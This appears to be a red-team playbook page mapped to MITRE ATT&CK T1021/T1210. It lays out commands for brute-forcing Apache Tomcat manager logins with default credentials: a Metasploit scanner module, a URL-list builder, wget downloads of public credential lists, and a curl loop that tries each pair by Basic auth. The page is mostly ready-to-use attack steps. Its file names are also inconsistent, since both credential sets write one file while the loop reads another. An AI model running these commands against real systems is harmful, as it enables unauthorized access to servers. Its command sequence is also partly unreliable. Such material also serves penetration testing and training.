
# Flawed HTTP Remote Services

## Overview

MITRE ATT&CK mapping: T1021 / T1210

## Procedures

### Apache Tomcat: default/weak credentials

Use Metasploit module:

```
auxiliary/scanner/http/tomcat_mgr_login
```

OR (if many different ports are used), prepare target list:

```
Prereq: Nmap scan results imported to msf

msf> services -S Coyote -c port -o /tmp/tomcat.csv
$ for i in $(cat /tmp/tomcat.csv | tr -d '"' | tr ',' ':'); do echo "http://$i/manager/html"; done > tomcat-urls.txt
```

Prepare creds list:

```
# Set 1:
wget https://raw.githubusercontent.com/wintrmvte/medusa_combo_files/master/tomcat_default_79.txt
cat tomcat_default_79.txt | cut -d: -f2,3 > PAYLOADS/tomcat-defaults-2.txt

# Set 2:
$ wget https://raw.githubusercontent.com/netbiosX/Default-Credentials/master/Apache-Tomcat-Default-Passwords.mdown
$ cat Apache-Tomcat-Default-Passwords.mdown | tr -d ' ' | awk -F'|' '{print $2":"$3}' > PAYLOADS/tomcat-defaults-2.txt
```

Launch:

```
while read line; do echo -n "$line : "; for i in $(cat PAYLOADS/tomcat-defaults-1.txt); do RES=$(curl -k -H "Authorization: Basic $(echo -n "$i" | base64)" -s -o /dev/null -w "%{http_code}" --url "$line"); echo "$i:: $RES"; [ "$RES" -eq 200 ] && break; done; done < tomcat-urls.txt | tee tomcats-results-2.txt
```

## OPSEC considerations

## Counter-countermeasures
